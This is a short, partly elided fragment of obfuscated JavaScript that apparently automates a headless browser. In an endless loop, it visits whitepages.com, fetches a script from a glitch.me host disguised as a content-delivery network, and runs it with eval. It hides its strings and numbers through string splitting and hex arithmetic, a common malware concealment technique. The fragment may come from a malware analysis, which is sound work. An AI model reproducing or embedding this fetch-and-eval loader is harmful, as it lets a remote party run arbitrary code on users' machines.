((async () => {
  ...
  (async function g() {
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x61 * -0x53 + -0x31c + -0x1c57), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0x5 * -0x14b77 + -0xb6fff + 0x12b24c), await j['close'](), await i['close'](), g());
  }());
})());